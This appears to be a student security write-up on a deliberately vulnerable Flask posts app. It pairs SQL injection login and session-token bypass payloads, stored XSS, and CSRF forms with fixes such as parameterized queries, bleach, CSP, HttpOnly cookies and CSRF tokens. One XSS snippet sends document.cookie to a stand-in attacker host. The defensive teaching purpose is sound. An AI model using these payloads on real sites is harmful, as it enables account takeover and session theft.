# SQL Injections

## Attack 1

This SQL statement used in the `/login` endpoint is vulnerable to injections:

```python
res = cur.execute("SELECT id from users WHERE username = '"
	+ request.form["username"]
  + "' AND password = '"
  + request.form["password"] + "'")
```

With this, we can inject arbitrary SQL code, enabling the following attacks:

- Logging into the first user retrieved by the query
  - Username: `' OR '1'='1`
  - Password: `' OR '1'='1`
- Logging into a specific user if you know their username (e.g. “alice”)
  - Username: `alice`
  - Password: `' OR '1'='1`
- Logging into some random user, assuming you don’t know anyone’s usernames
  - Username: `' OR '1'='1`
  - Password: `' OR '1'='1' ORDER BY random() --`
- Log into every user’s account iteratively to find out all existing usernames
  - Username: `' OR '1'='1`
  - Password: `' OR '1'='1' LIMIT 1 OFFSET x --`
    - where $x$ is in $[0,n-1]$ and $n=\text{number of users}$

### Fix

Because this statement relies on injecting real SQL commands into the query, we can nullify it using query parameterization. SQLite3 calls this [parameter substitution](https://docs.python.org/3/library/sqlite3.html#sqlite3-placeholders), and it can be done like so:

```python
res = cur.execute(
    "SELECT id from users WHERE username = ? AND password = ?",
    (
        request.form["username"],
        request.form["password"],
    ),
)
```

## Attack 2

The `/login`, `/home`, `/posts`, and `/logout` endpoints above all perform their “user authentication” using a snippet that looks like this:

```python
if request.cookies.get("session_token"):
    res = cur.execute("SELECT users.id, username FROM users INNER JOIN sessions ON "
                      + "users.id = sessions.user WHERE sessions.token = '"
                      + request.cookies.get("session_token") + "'")
    user = res.fetchone()
    if user:
      # Perform some action

```

Notice that this “authentication” relies entirely on the `session_token` cookie. If we can bypass this check somehow, we can pose as any user without needing their username or password. This means we can login, view posts, create posts, and logout of any account if we configure the `session_token` correctly. For this attack, we rely on the attacker manually changing their `session_token` into a SQL injection.

This enables the following attacks:

- Pose as the user whose session token is retrieved first by the query:
  - session_token: `' OR '1'='1' --`
- Pose as the user whose session token is retrieved in some other row of the query:
  - session_token: `' OR '1'='1' LIMIT 1 OFFSET n --`

<aside>
⚠️ This attack is only limited to users who currently have a session in the `sessions` table (i.e. previously logged in and haven’t yet logged out).

</aside>

### Fix

Again, we can fix this with query parameterization.

```python
if request.cookies.get("session_token"):
    res = cur.execute(
        "SELECT username FROM users INNER JOIN sessions ON users.id = sessions.user WHERE sessions.token = ?",
        (request.cookies.get("session_token"),),
    )
    user = res.fetchone()
    if user:
      # Perform some action

```

# XSS Attacks

## Attack 1

A user’s posts can contain arbitrary scripts. Simply paste a snippet like this into their `/home` endpoint, or send it via `POST /posts` directly.

```html
<script>
  alert("This is super dangerous!");
</script>
```

When the victim loads their homepage, this script would run automatically. This is especially dangerous when combined with the exploit that lets us log in as anyone, since we can inject malicious JS into other people’s accounts and the script would run next time they log in.

### Fix

We can completely disable new posts from being run as scripts by sanitizing the `<` and `>` characters. This prevents post names from being read as HTML elements, especially scripts.

```python
message = request.form["message"].replace("<", "&lt;").replace(">", "&gt;")
cur.execute(
	"INSERT INTO posts (message, user) VALUES (?, ?)",
	(message, user[0]),
)
con.commit()
```

Of course, this is a very primitive fix. We can use the 3rd-party [bleach](https://bleach.readthedocs.io/en/latest/clean.html) package to sanitize the input for us.

```python
message = bleach.clean(request.form["message"])
cur.execute(
    "INSERT INTO posts (message, user) VALUES (?, ?)",
    (message, user[0]),
)
con.commit()
```

## Attack 2

Suppose that an attacker was still able to inject a malicious script into the database, despite our sanitization of user inputs.

```html
<script>
  alert("This is super dangerous!");
</script>
```

Even if we implemented the sanitization fix from the previous attack, this would only apply to future posts. Pre-existing posts would still be able to execute malicious scripts whenever a user loads their homepage.

### Fix

We can set the `Content-Security-Policy` header to disable inline scripts from being executed. [flask-csp](https://github.com/twaldear/flask-csp) does this with default policies that are sufficient for our purposes. This policy only needs to be set in the home page because this is where posts (which may contain inline scripts) are rendered.

```python
from flask_csp.csp import csp_header

...

@app.route("/")
@app.route("/home")
@csp_header()
def home():
   ...
```

# CSRF Attacks

## Attack 1

Suppose that the following post was previously injected in the victim’s posts:

```html
<img id="evil-image" />
<script>
  document.getElementById("evil-image").src =
    `https://www.my-evil-site.com/?${document.cookie}`;
</script>
```

This uses the `document.cookie` JS attribute and leaks the user’s cookies (including the session token) and sends them to our site. The attacker can then send requests posing as the victim.

### Fix

The session token can be made invisible to JavaScript using the `HttpOnly` flag in whichever lines the cookie is set:

```html
response.set_cookie("session_token", token, httponly=True)
```

## Attack 2

Suppose the victim is logged into `bangko.com.ph`. An attacker manages to inject the following into the victim’s posts:

```python
<img src="https://bangko.com.ph/transfer?amount=10000&recipient=177013" />
```

The next time the victim opens their posts in their browser, a request to [bangko.com.ph](http://bangko.com.ph) is automatically sent with their cookies attached, making it look like a genuine request from the user. The attacker could make arbitrary requests to other websites while piggybacking off the victim’s cookies.

### Fix

We can prevent this attack using input sanitization, the same fix that prevents XSS attacks. This is because this type of attack relies on injecting new HTML elements.

```python
message = bleach.clean(request.form["message"])
cur.execute(
    "INSERT INTO posts (message, user) VALUES (?, ?)",
    (message, user[0]),
)
con.commit()
```

This fix only applies to future posts getting created. For pre-existing posts that already contain HTML elements, setting the `Content-Security-Policy` is sufficient.

```python
from flask_csp.csp import csp_header

...

@app.route("/")
@app.route("/home")
@csp_header()
def home():
   ...
```

## Attack 3

Suppose there was some other malicious website (different from the one in the Machine Problem) that automatically added a post when a victim loaded it:

```python
    <form method="post" action="http://127.0.0.1:5000/posts">
      <input type="hidden" name="message" value="Malicious post here">
      <input type="submit" value="Post!">
    </form>
    <script>document.forms[0].submit()</script>
```

Upon visiting this site, any user that’s logged in to our Posts website would be vulnerable to arbitrary posts being added to their account. This is extra dangerous when combined with the XSS attack from earlier, since they’d be able to run arbitrary scripts within the malicious post.

<aside>
💡 The previous attack does CSRF by forging requests from this website to other websites. This attack goes the opposite direction, forging requests from other websites to this website.

</aside>

### Fix

This CSRF attack can be circumvented by adding a CSRF token. The third-party package [Flask-WTF](https://flask-wtf.readthedocs.io/en/0.15.x/csrf/) lets us protect the entire Flask app using CSRF tokens like so:

```python
...
from flask_wtf.csrf import CSRFProtect

 ...
app = Flask(__name__)
app.config["SECRET_KEY"] = secrets.token_hex()
csrf = CSRFProtect(app)
```

Then we just need to add the following input field to every `<form />` that currently exists in each template:

```html
<input type="hidden" name="csrf_token" value="{{ csrf_token() }}" />
```
